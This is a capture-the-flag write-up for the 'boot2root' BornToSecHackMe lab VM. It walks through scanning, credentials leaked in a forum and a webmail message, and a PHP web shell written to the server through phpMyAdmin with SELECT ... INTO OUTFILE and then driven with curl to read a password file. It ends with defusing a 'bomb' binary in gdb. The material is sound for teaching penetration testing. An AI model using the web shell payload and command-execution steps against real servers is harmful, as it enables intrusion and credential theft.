# WRITEUP1

After installing and launching the VM, we are asked for a password and the machine's ip address is not indicated.
We are looking to scan an open port from our vm, for that, we configure the network of our vm (on VM box) in bridge access.
We are trying to find a potential ip address created by the VM:


### LOOK AROUND

```bash
λ arp -a

Interface : 192.168.99.1 --- 0x6
  Adresse Internet      Adresse physique      Type
  192.168.99.255        ff-ff-ff-ff-ff-ff     statique
  ....

Interface : 192.168.1.26 --- 0x8
  Adresse Internet      Adresse physique      Type
  192.168.1.1           6c-ba-b8-be-0a-20     dynamique
  192.168.1.10          20-9a-7d-c0-45-d5     dynamique
  192.168.1.11          78-dd-12-93-0b-02     dynamique
  192.168.1.12          ec-b5-fa-31-6f-1f     dynamique
  192.168.1.13          48-ba-4e-c5-ce-7e     dynamique
  192.168.1.14          48-d6-d5-71-33-6d     dynamique
  192.168.1.15          42-e5-79-05-cc-33     dynamique
  192.168.1.16          84-b8-b8-04-7f-fb     dynamique
  192.168.1.17          e0-ac-cb-33-5b-bf     dynamique
  192.168.1.22          08-00-27-99-d9-06     dynamique
  224.0.0.250           01-00-5e-00-00-fa     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  224.0.1.60            01-00-5e-00-01-3c     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  239.255.255.251       01-00-5e-7f-ff-fb     statique
  ...

```
We can also find the ip address directly in the router's configs.

Now, we try to test the `dynamic` type addresses with the `ping` command.
Several addresses send back a `pong`, we can try them one by one with `nmap` to see if anything is up on those:

```bash
λ nmap 192.168.1.22
Nmap scan report for IP (IP)
Host is up (0.0055s latency).
Not shown: 987 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
119/tcp open  nntp
143/tcp open  imap
443/tcp open  https
465/tcp open  smtps
563/tcp open  snews
587/tcp open  submission
993/tcp open  imaps
995/tcp open  pop3s
Nmap done: 1 IP address (1 host up) scanned in 4.71 seconds
```

### WEB

The address `{IP_VM}` has a website that shows us a page with` HACK ME` written in it. After various tests and some research we finded different ways to discover other accessible pages.

We used `web scanners` `Arachni`, `dirb` and`nikto`, all present by default on the `kali` OS.

We will be working with the `Kali` OS on`wsl` from now on because it includes most of the `Pen Testing` tools that we will need later.

```bash
└─$ dirb https://{IP_VM}/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Wed Sep  8 13:21:51 2021
URL_BASE: https://{IP_VM}/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: https://{IP_VM}/ ----
+ https://{IP_VM}/cgi-bin/ (CODE:403|SIZE:289)
==> DIRECTORY: https://{IP_VM}/forum/
==> DIRECTORY: https://{IP_VM}/phpmyadmin/
+ https://{IP_VM}/server-status (CODE:403|SIZE:294)
==> DIRECTORY: https://{IP_VM}/webmail/
```


Thanks to these `web scanners` we identify new accessible pages:`/forum`, `/phpmyadmin`,`/webmail`. In the forum post `Login problem?`, We can see connection attempts with different usernames and what looks like a password:

```bash
Oct 5 08:45:29 BornToSecHackMe sshd\[7547\]: Failed password for invalid user !q\]Ej?\*5K5cy\*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd\[7547\]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail \[preauth\]
Oct 5 08:46:01 BornToSecHackMe CRON\[7549\]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
```

We managed to log in with the username `lmezard` and the password `!q\]Ej?\*5K5cy\*AJ` to the forum. On the user's profile we can get the user's email address: `laurie@borntosec.net`. We try to log into `http://{IP_VM}/webmail` with the email address and the previous password. We connect successfully.
One of the user's emails gives us access to the `phpmyadmin` page:

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

### PHPMYADMIN ACCESS - root

phpmyadmin user: `root`
phpmyadmin password: `Fg-'kKXBj87E:aJ$`

Now that we have root access to the SQL database, we are trying to do an exploit called `web shell`. Thanks to `dirb` we can obtain a list of the directories used by the site:

```bash
└─$ dirb https://{IP_VM}/forum/

...

==> DIRECTORY: https://{IP_VM}/forum/js/
==> DIRECTORY: https://{IP_VM}/forum/lang/
==> DIRECTORY: https://{IP_VM}/forum/modules/
==> DIRECTORY: https://{IP_VM}/forum/templates_c/
==> DIRECTORY: https://{IP_VM}/forum/themes/
==> DIRECTORY: https://{IP_VM}/forum/update/

└─$ dirb https://{IP_VM}/webmail/

...

==> DIRECTORY: https://{IP_VM}/webmail/plugins/
==> DIRECTORY: https://{IP_VM}/webmail/src/
==> DIRECTORY: https://{IP_VM}/webmail/themes/
```

We are trying to get the default folder from the web server:

```bash
└─$ whatweb https://{IP_VM}/
https://{IP_VM}/ [404 Not Found] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[{IP_VM}], Title[404 Not Found]
```
The server is running on Apache 2 so `/var/www` should be the default folder.

We try to create a new page that will allow us to use the `shell`. For that we use the command `SELECT "<? system($_REQUEST['cmd']); ?>",2,3,4 INTO OUTFILE "/var/www/{folder}/{filename}.php" -- 1`
with the different folders available to find one with write rights. We manage to write our file in the `templates_c` folder.

The sql request to create our `web_shell` file:

```sql
SELECT "<html><body><pre><form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\"><input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\"><input type=\"SUBMIT\" value=\"Execute\"></form><?php if(isset($_GET['cmd'])){echo 'Shell: ';system($_GET['cmd']);}?></pre></body></html>" INTO OUTFILE '/var/www/forum/templates_c/web_shell.php'
```

a simplify option without the `html` for `curl`:

```sql
SELECT "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);}?>" INTO OUTFILE '/var/www/forum/templates_c/curl_shell.php'
```

We retrieve the name of our user:

```bash
└─$ curl -k https://{IP_VM}/forum/templates_c/curl_shell.php?cmd=whoami
www-data
```

We can look now for all the files our current user has created:

```bash
└─$ curl -k https://{IP_VM}/forum/templates_c/curl_shell.php?cmd=find+/+-user+www-data+\|head+-10
/home
/home/LOOKATME
/home/LOOKATME/password
/proc/1288
/proc/1288/task
/proc/1288/task/1288
/proc/1288/task/1288/fd
/proc/1288/task/1288/fd/0
/proc/1288/task/1288/fd/1
/proc/1288/task/1288/fd/2
```
There is a folder written `LOOKATME` and a file `password`:

```bash
└─$ curl -k https://{IP_VM}/forum/templates_c/curl_shell.php?cmd=cat+/home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"
```

Password of lmezard : `G!@M6f4Eatau{sF"`

We can now try to connect in ssh to our VM.
```bash
└─$ ssh lmezard@{IP_VM}
...
lmezard@{IP_VM}'s password:
Permission denied, please try again.
```
too bad, let's try again with the `ssh` port finded with nmap before, it's not working neither...
Let's try with the `ftp` port 21 with an external software and `lmezard` credential. It's working !!

### FTP ACCESS - lmezard

ftp user: `lmezard`
ftp password: `G!@M6f4Eatau{sF"`

Now we have access to a file `README` and `fun`. The readme file say that we have to resolve the puzzle to get the password for the user `laurie`.  First let's download the `fun` file on our computer and second let's get some info about it:

```bash
└─$ file fun
fun: POSIX tar archive (GNU)
```

The `fun` file seems to be a tared file, so we should untar it first:
```bash
└─$ sudo tar xvf fun
...
ft_fun/DFO1G.pcap
ft_fun/G3VJZ.pcap
ft_fun/Y8S1M.pcap
```

Now we have a folder called `ft_fun` with a lot of `pcap` files.

We can find a `main`:
```bash
└─$ grep main * -A35 -B2
BJPCP.pcap-     printf("Hahahaha Got you!!!\n");
BJPCP.pcap-}*/
BJPCP.pcap:int main() {
BJPCP.pcap-     printf("M");
BJPCP.pcap-     printf("Y");
BJPCP.pcap-     printf(" ");
BJPCP.pcap-     printf("P");
BJPCP.pcap-     printf("A");
BJPCP.pcap-     printf("S");
BJPCP.pcap-     printf("S");
BJPCP.pcap-     printf("W");
BJPCP.pcap-     printf("O");
BJPCP.pcap-     printf("R");
BJPCP.pcap-     printf("D");
BJPCP.pcap-     printf(" ");
BJPCP.pcap-     printf("I");
BJPCP.pcap-     printf("S");
BJPCP.pcap-     printf(":");
BJPCP.pcap-     printf(" ");
BJPCP.pcap-     printf("%c",getme1());
BJPCP.pcap-     printf("%c",getme2());
BJPCP.pcap-     printf("%c",getme3());
BJPCP.pcap-     printf("%c",getme4());
BJPCP.pcap-     printf("%c",getme5());
BJPCP.pcap-     printf("%c",getme6());
BJPCP.pcap-     printf("%c",getme7());
BJPCP.pcap-     printf("%c",getme8());
BJPCP.pcap-     printf("%c",getme9());
BJPCP.pcap-     printf("%c",getme10());
BJPCP.pcap-     printf("%c",getme11());
BJPCP.pcap-     printf("%c",getme12());
BJPCP.pcap-     printf("\n");
BJPCP.pcap-     printf("Now SHA-256 it and submit");
BJPCP.pcap-}
BJPCP.pcap-/*
BJPCP.pcap-void useless() {
BJPCP.pcap-     printf("Hahahaha Got you!!!\n");
BJPCP.pcap-}void useless() {
```

Now we have to find all the `getme` files. We can find some with `grep "getme" * -A5` But some other are dispatched in mutiples files. By following the next files we can get the actual codes of the functions. After this we just have to compile and execute the `c` code:
```bash
└─$ gcc main.c

└─$ ./a.out
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submi

└─$ echo -n "Iheartpwnage" | sha256sum
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

Now we can try again to connect in ssh with user `laurie` and password `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` :
```bash
└─$ ssh laurie@{IP_VM}
...
laurie@{IP_VM}'s password:
laurie@BornToSecHackMe:~$ ls
bomb  README
```


### SSH ACCESS - laurie

ssh user: `laurie`
ssh password: `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

```bash
laurie@BornToSecHackMe:~$ cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```


It seems that we must find passwords by diffusing the `bomb` file..
We copy the `bomb` file to disassemble it with`ghidra` or `gdb`:

```bash
└─$ scp -r -p laurie@{IP_VM}:bomb .
...
laurie@{IP_VM}'s password:
bomb                                                                                               100%   26KB   6.1MB/s   00:00
```

We realize that we have to solve different phases to diffuse the bomb

#### Defuse the bomb

The bomb take input before each phase.

##### phase 1

The input is compared with the string `Public speaking is very easy.`

##### phase 2

The input should be 6 numbers separeted by one space. those 6 numbers are as follow : `1 2 6 24 120 720`

##### phase 3

The input should be of the format `number char number` and we know from the readme that the char should be a `b`  : `1 b 214`

##### phase 4

The input should be of the format `number`,  the function compare the return of `func4` and 55.  we rewrited the function in `python` to try it out and check which input return 55. result here is `9`.

##### phase 5

The input should be of 6 characters. This one is a little bit more tricky, our string is passing by a cipher and after is bein compared with the string `giants`.
let's try to figure out what's happening to our string with `gdb`:

```bash
(gdb) b *phase_5
Breakpoint 2 at 0x8048d2c

.....

So you got that one.  Try this one.
aaaaaa

Breakpoint 2, 0x08048d2c in phase_5 ()
(gdb) disas phase_5
Dump of assembler code for function phase_5:
=> 0x08048d2c <+0>:     push   %ebp
   0x08048d2d <+1>:     mov    %esp,%ebp
   0x08048d2f <+3>:     sub    $0x10,%esp
   0x08048d32 <+6>:     push   %esi
   0x08048d33 <+7>:     push   %ebx
   0x08048d34 <+8>:     mov    0x8(%ebp),%ebx
   0x08048d37 <+11>:    add    $0xfffffff4,%esp
   0x08048d3a <+14>:    push   %ebx
   0x08048d3b <+15>:    call   0x8049018 <string_length>
   0x08048d40 <+20>:    add    $0x10,%esp
   0x08048d43 <+23>:    cmp    $0x6,%eax
   0x08048d46 <+26>:    je     0x8048d4d <phase_5+33>
   0x08048d48 <+28>:    call   0x80494fc <explode_bomb>
   0x08048d4d <+33>:    xor    %edx,%edx
   0x08048d4f <+35>:    lea    -0x8(%ebp),%ecx
   0x08048d52 <+38>:    mov    $0x804b220,%esi
   0x08048d57 <+43>:    mov    (%edx,%ebx,1),%al
   0x08048d5a <+46>:    and    $0xf,%al
   0x08048d5c <+48>:    movsbl %al,%eax
   0x08048d5f <+51>:    mov    (%eax,%esi,1),%al
   0x08048d62 <+54>:    mov    %al,(%edx,%ecx,1)
   0x08048d65 <+57>:    inc    %edx
   0x08048d66 <+58>:    cmp    $0x5,%edx
   0x08048d69 <+61>:    jle    0x8048d57 <phase_5+43>
   0x08048d6b <+63>:    movb   $0x0,-0x2(%ebp)
   0x08048d6f <+67>:    add    $0xfffffff8,%esp
   0x08048d72 <+70>:    push   $0x804980b
   0x08048d77 <+75>:    lea    -0x8(%ebp),%eax
   0x08048d7a <+78>:    push   %eax
   0x08048d7b <+79>:    call   0x8049030 <strings_not_equal>
   0x08048d80 <+84>:    add    $0x10,%esp
   0x08048d83 <+87>:    test   %eax,%eax
   0x08048d85 <+89>:    je     0x8048d8c <phase_5+96>
   0x08048d87 <+91>:    call   0x80494fc <explode_bomb>
   0x08048d8c <+96>:    lea    -0x18(%ebp),%esp
   0x08048d8f <+99>:    pop    %ebx
   0x08048d90 <+100>:   pop    %esi
   0x08048d91 <+101>:   mov    %ebp,%esp
   0x08048d93 <+103>:   pop    %ebp
   0x08048d94 <+104>:   ret
End of assembler dump.

(gdb) b *phase_5+79
Breakpoint 3 at 0x8048d7b
(gdb) c
Continuing.

Breakpoint 3, 0x08048d7b in phase_5 ()
(gdb) x/s $eax
0xbffff710:      "ssssss"
```
After a bit of investigation, we find out that our input string is used as an index for another string `charset = isrveawhobpnutfg` with the operation:

```c
charset[((int)str[i] & 15)]
```

This operation is getting an index for our charset from the input string, so we need to get the correct alphabetic index corresponding to the correct letter index in the charset.
For example, the first letter of `giants` is a`g`, for which his index is `15` in the charset string, so our input should be the fiftheen's letter of the alphabet corresponding to `o`.


So the corresponding input string is `opekmq`. Note here that we used alphabetic character but there is a lot of others possibility in ascii tab !

##### phase 6


After analysing the phase 6 we know that we need 6 inputs numbers. Our inputs numbers should be different from eachother and have a value under 7.
With GDB we can find an int tab whose taking pre-defined value from `node1, node2, ..., node6` and we can get those value with gdb:

```bash
(gdb) b phase_6
Breakpoint 1 at 0x8048da1
(gdb) r
....
opekmq
Good work!  On to the next...
123456

Breakpoint 1, 0x08048da1 in phase_6 ()

(gdb) p (int)node1
$5 = 253
(gdb) p (int)node2
$6 = 725
(gdb) p (int)node3
$7 = 301
(gdb) p (int)node4
$8 = 997
(gdb) p (int)node5
$9 = 212
(gdb) p (int)node6
$10 = 432
```

So we have the following tab : 
```c 
int tab_to_sort[6] = {253, 725, 301, 997, 212, 432};
``` 
And the functions seems to sort this tab from our input and put the sorted value in a new tab. This new tab is checked at the end of the function:
```c
int sorted_tab[6] = sort(tab_to_sort);
i = 0;
while (i < 5)
{
    if (sorted_tab[i] < sorted_tab[i + 1])
    {
        explode_bomb();
    }
    i = i + 1;
}
```
We know that the resulting tab need to be sorted by ascending order so before investigating further the sorting process we can try to "select" the correct numbers order with our input in both ways (ascending/descending) : `5 1 3 6 2 4` or `4 2 6 3 1 5`. We know from the clue that the first number should start by 4 so let's try by descending order first. It's working !

```bash
└─$ cat -e bomb_response.txt
Public speaking is very easy.$
1 2 6 24 120 720$
1 b 214$
9$
opekmq$
4 2 6 3 1 5$

┌──(sithis㉿MAGA-PC)-[/mnt/c/Users/MaSit/OneDrive/Bureau/42/hack/boot2root/scripts]
└─$ ./bomb < bomb_response.txt
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Phase 1 defused. How about the next one?
That's number 2.  Keep going!
Halfway there!
So you got that one.  Try this one.
Good work!  On to the next...
Congratulations! You've defused the bomb!
```

Now we have the password for the user `thor` : `Publicspeakingisveryeasy.126241207201b2149opekmq426315`
Unfortunately this isn't working and after investigation, there is an error in the subject as we can see 
[here](https://app.slack.com/client/T039P7U66/C7NF60E0Z/thread/C7NF60E0Z-1607701664.278400), The real answer is `Publicspeakingisveryeasy.126241207201b2149opekmq426135`

```bash
laurie@BornToSecHackMe:~$ su thor
Password:
thor@BornToSecHackMe:~$ ls
README  turtle
```

### SSH ACCESS - thor

ssh user: `thor`
ssh password: `Publicspeakingisveryeasy.126241207201b2149opekmq426135`